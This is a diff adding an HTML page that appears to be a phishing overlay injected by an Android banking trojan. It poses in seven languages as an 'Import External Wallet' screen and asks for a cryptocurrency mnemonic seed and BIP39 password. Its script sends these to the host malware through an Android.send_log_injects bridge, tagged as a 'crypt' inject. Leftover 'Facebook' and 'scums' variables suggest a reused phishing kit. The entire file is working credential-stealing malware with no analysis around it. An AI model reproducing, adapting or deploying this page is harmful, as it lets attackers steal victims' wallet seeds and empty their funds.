@@ -1,0 +1,259 @@
+<!DOCTYPE html> 
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        body {
+            background-color: #272c33;
+            color: #bab9b9;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 20px;
+        }
+
+        section {
+            flex: 1;
+            padding: 10px;
+        }
+
+        textarea {
+            width: 100%;
+            background-color: #1a1c1f;
+            border: 0;
+            border-radius: 3px;
+            color: #fff;
+            padding: 15px;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .input {
+            padding: 6px;
+            width: 100%;
+            background-color: transparent;
+            border: 0;
+            border-bottom: 1px solid #8f9295;
+            margin-bottom: 25px;
+            color: #fff;
+        }
+
+        .input:focus {
+            border-color: #03a9f4;
+        }
+
+        footer {
+            background-color: #2f2f2f;
+            text-align: center;
+        }
+
+        .button {
+            float: right;
+            padding: 0;
+            border: 0;
+            background-color: transparent;
+            color: #bab9b9;
+            padding: 14px;
+        }
+
+        .button:disabled {
+            opacity: 0.3;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 24px;margin-right: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABECAMAAAD5hOYYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUFGQjE3ODRBQThBMTFFQUJFNjlDQkQxNjMwRDM0OEQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUFGQjE3ODVBQThBMTFFQUJFNjlDQkQxNjMwRDM0OEQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1QUZCMTc4MkFBOEExMUVBQkU2OUNCRDE2MzBEMzQ4RCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1QUZCMTc4M0FBOEExMUVBQkU2OUNCRDE2MzBEMzQ4RCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pgq1cFsAAAI0UExURScsMygtNCkuNSouNSovNiswNywxOC0yOS4zOS80OzA1PDE2PTI3PTM4PjQ4PzU5QDU6QTY7QTc8Qjg9Qzk9RDo+RTo/RT1CSD5CST9DSUBESkNHTURITkVJT0VKUEZLUUdLUUlNU0pOVEtPVUtQVUxQVk9TWVBUWVFVWlFVW1JWXFRYXVZaX1dbYVhcYVldYlpeY1teZFxfZV9jaGBjaWFkaWFlamJma2NnbGRobWVobWZpbmltcWptcmxvdGxwdXF0eXJ1eXJ2enN2e3R3fHp9gXt+gn2AhH2AhX6BhX+ChoCDh4GEiIKFiYOGioSHi4aJjYeKjYiKjoiLj4qNkYuOkYyOko2Pk42QlJKUmJOWmZSXmpWYm5aYnJeZnZmbnpmcn5qdoJudoZyeoZ2fop6go6GjpqSmqaWnqqaoq6eprKiqramrramrrqqsr6utsKyusa2vsa6wsq+ws7CytbGztba4ure5u72+wb6/wb/Awr/Bw8DCxMHDxcLDxcPExsTFx8XGyMXHycbIycfIysjJy8rLzcrMzczNz83O0M7P0c/Q0dDR09HS1NXW2NbX2djZ2tna29rb3Nvb3dvc3dzd3t3e397f4N/g4eDg4eHi4+Lj5OPk5eTl5eXl5ubm5+bn6Ojp6enp6urq6+vr7Ozs7ezt7e3u7u7u7+/v8PDw8fHx8fHy8vLz8/T09fX19fb29vf39/f4+Pj4+fn5+fr6+vv7+/z8/Pz9/f39/f7+/v///1jUlV0AAAM1SURBVEjH7Zb9W0thGMefsx1WS6dZRfKSiBBTyFsIydZUooRCXqLQMkRWKDKW8lbK6xTNMtVaPGftnO8/54dIVzvqOX5yufr+eD/X57rv873v674PIeHSRugFg9FoNBoEvU5LWMTxiZnWCnu9w1Fvr8jblMhz0zNC0tbCS02d3kAoFPB23L1YuCVJmBZKsTr7R0OSDACyFBr1PrAsn6a0eTvPt3pETJDocVXuiJ+qxHlb7N0Yy0FHRuhYPnTVbo6fAtpp76UAAIn2vX7joRIAgPbW7vizBynnuymA796H9vLi/Pzi8quPvlAAtKty2R/c4JKsrQBk6m4uSovUEKKJXFvc0kNlAC7zEuXP4rc6PQBo5wXTQkHLEcJphUXpVd0UgKdls2KXtYmF/SLw3X1h22zNr6BGl1XVQwHqLVigREVkXhoF4G02zZ4Y1mU4fQCC1Rt1CpDe2hQC8LBooWZiWLP4iAtA6I5Fr+RdRacEWbKnTfIpxnRdAqQXp5T8M9i9MiRaHjmpdn7OqaAM2XPFoAAZ6wMA7SvWTPKW05b0i8DwzbkKUKwjBAReHQh/KXg7AoQcsUrQbRkY7swLfznQHQDkRmUIwHCHJfzF2hUAcPt/hzjDasvJ6hpbXS+A4FeXLUyuwVEAvXW2muoT5tQYjhA+asMxZ48og0ES/dBSmhHFk+hlNrc/yMQActDvvpwcTVYcfsKKjGHtRSkky/kZquRp2U729X1TB418zCG5oqQOkmguMUO1zDPQPwJJ1D/g8w34lRuvDMlfHp+27NqVd6bNJ7NC4sCtknXzdboE05GGwSAjNPh8dzTPEcLxwp6OIUbo6fFU/uceX1X2jBFymMZ3SFxGAyNUN3f8rOli6xiha5H8+J2Jusaayaj7nekGI9SQHvcLit/QyOpe2aqf9c1ac4LVvaGOPcJYnww5L1n7FBxsKF2fEBGxIP1o41CQefZ8bWfzsrOt59q/yiqmXFQ/5TM74t+Dculf3KecT6ov4V6S9UDtzb23jaQcald13cW2g8tJdPJlFf8Rov/dxaVzCB+VUXrfzeaGRN/fK1mv5wnhYlLN5VU1NgbVVJXtXylw5AfttNY6dbK71wAAAABJRU5ErkJggg==" alt="">
+            <span style="font-weight: 600;font-size: 14px;color: #fff;position: relative;top: -7px;"> {{t.__text1}} </span><br>
+            <span style="font-weight: 600;font-size: 12px;position: relative;top: -20px;margin-left: 38px;"> {{t.__text2}} </span>
+        </header>
+        <section>
+            <span style="display: block;margin-bottom: 5px;font-size: 14px;"> {{t.__text3}} </span>
+            <textarea name="login" id="login" cols="30" rows="4" placeholder="Enter your code here"></textarea>
+
+            <span style="float: right;font-size: 12px;font-weight: 600;" id="showPass"> {{t.__text4}} </span>
+
+            <div id="pass" style="display: none;">
+                <span style="display: block;margin-bottom: 5px;font-size: 14px;">{{t.__text3}}</span>
+                <input type="password" class="input" id="password" name="password" autocomplete="off">
+
+                <span style="float: right;font-size: 12px;font-weight: 600;" id="hidePass"> {{t.__text5}} </span>
+
+            </div>
+        </section>
+        <footer>
+            <div style="float: left;padding: 14px;">
+                <i class="fa fa-angle-left" aria-hidden="true"></i> {{t.__back}}
+            </div>
+
+            <div style="display: inline-block;padding: 14px;">
+                <img style="width: 50px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGgAAAAYCAMAAAAh4EhSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Njg5MzA3REFBQThBMTFFQTlEOUFGQzlGNjkyMjA5MjgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Njg5MzA3REJBQThBMTFFQTlEOUFGQzlGNjkyMjA5MjgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2ODkzMDdEOEFBOEExMUVBOUQ5QUZDOUY2OTIyMDkyOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2ODkzMDdEOUFBOEExMUVBOUQ5QUZDOUY2OTIyMDkyOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PlzxvGgAAABLUExURS8vLzEyMzFLTjIzNTM1ODM1OTNXWzRudDRudTY5PTY5PjeRmzeSmziKkziPmTiQmTk+RDo/Rju1wzu2wzxBST1DTD3C0T7Z6kDs/0axYBMAAADsSURBVEjHvZbJEoMgFATZVNyiIgj//6U5WGUZGAkYQ5+bmRLRByE7rOmVtesgGYlCRTdrPXcVvedN7uAVW9+Zg+6GV2/uxFZfLeeLObHwXG90HiNe3xqPNs+rXQB8Jm4CeJa3hUUbCljCgCXHeznAFH2/0RNx5TEHCU45NRCa7Elc1PgBFQ4Qyd6Ai/qkHQF7d+mtuEj5ATMOmJM9i4usH6BxgE72ihUpXLQ+vnU9LhoePwwNLpJ+gMABVbJX7IM9j6LoUPr1F1Tup1puTBQbfOVG+edQmv54OSGEMDms1qq++XbdqvZrlKCZ3htc9nINuIQKPwAAAABJRU5ErkJggg==" alt="">
+            </div>
+
+            <button class="button" id="sendData" disabled> {{t.__next}} <i class='fa fa-angle-right' aria-hidden='true'></i></button>
+        </footer>
+    </form>
+
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password'),
+            sendData = document.getElementById('sendData'),
+            pass = document.getElementById('pass'),
+            showPass = document.getElementById('showPass'),
+            hidePass = document.getElementById('hidePass');
+
+        login.onkeyup = () => {
+            if(login.value.split(" ").length >= 12 && password.value.length > 4) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        password.onkeyup = () => {
+            if(login.value.split(" ").length >= 12 && password.value.length > 4) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        showPass.onclick = () => {
+            showPass.style.display = 'none';
+            pass.style.display = 'block'
+        }
+
+        hidePass.onclick = () => {
+            showPass.style.display = 'block';
+            pass.style.display = 'none'
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.Mnemonic = login.value;
+                data.bip39 = password.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+
+    
+<script>var text, 
+    link = "facebook.com", 
+    appname = "Facebook", 
+    texts = { 
+        tr: { 
+            __text1: "İTHALAT HARİCİ CÜZDAN",
+            __text2: "Başka bir sağlayıcıdan bir cüzdan almak için anımsatıcı tohum girin.",
+            __text3: "Hafıza",
+            __text4: "BIP39 ŞİFRE EKLE",
+            __text5: "BIP39 ŞİFRESİNİ KAPAT",
+            __back: "GERİ",
+            __next: "SONRAKİ",
+        }, 
+        
+        es: { 
+            __text1: "CARTERA EXTERNA DE IMPORTACIÓN",
+            __text2: "Introduzca su semilla mnemotécnica para importar una billetera de otro proveedor.",
+            __text3: "Mnemotécnico",
+            __text4: "AÑADIR BIP39 CONTRASEÑA",
+            __text5: "CERRAR CONTRASEÑA BIP39",
+            __back: "VOLVER",
+            __next: "SIGUIENTE",
+        },  
+
+        en: { 
+            __text1: "IMPORT EXTERNAL WALLET",
+            __text2: "Enter your mnemonic seed to import a wallet from another provider.",
+            __text3: "Mnemonic",
+            __text4: "ADD BIP39 PASSWORD",
+            __text5: "CLOSE BIP39 PASSWORD",
+            __back: "BACK",
+            __next: "NEXT",
+        }, 
+
+        fr: { 
+            __text1: "IMPORTER UN PORTEFEUILLE EXTERNE",
+            __text2: "Entrez votre graine mnémonique pour importer un portefeuille d'un autre fournisseur.",
+            __text3: "Mnémonique",
+            __text4: "AJOUTER UN MOT DE PASSE BIP39",
+            __text5: "FERMER LE MOT DE PASSE BIP39",
+            __back: "ARRIÈRE",
+            __next: "PROCHAIN",
+        }, 
+
+        ro: { 
+            __text1: "Portofelul extern de import",
+            __text2: "Introduceți sămânța mnemonică pentru a importa un portofel de la un alt furnizor.",
+            __text3: "Mnemonic",
+            __text4: "Adăugați PAROLA BIP39",
+            __text5: "ÎNCHIS PAROLA BIP39",
+            __back: "ÎNAPOI",
+            __next: "Următorul",
+        }, 
+
+        it: { 
+            __text1: "IMPORTA PORTAFOGLIO ESTERNO",
+            __text2: "Inserisci il tuo seme mnemonico per importare un portafoglio da un altro provider.",
+            __text3: "Mnemonico",
+            __text4: "AGGIUNGI PASSWORD BIP39",
+            __text5: "CHIUDI PASSWORD BIP39",
+            __back: "INDIETRO",
+            __next: "PROSSIMO",
+        },  
+
+        de: { 
+            __text1: "EXTERNE BRIEFTASCHE IMPORTIEREN",
+            __text2: "Geben Sie Ihren mnemonic seed ein, um eine Brieftasche von einem anderen Anbieter zu importieren.",
+            __text3: "Mnemonic",
+            __text4: "BIP39 PASSWORT HINZUFÜGEN",
+            __text5: "IN DER NÄHE BIP39 PASSWORT",
+            __back: "ZURÜCK",
+            __next: "NÄCHSTEN",
+        }, 
+    }
+    var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);</script>
+    
+</body>
+</html>
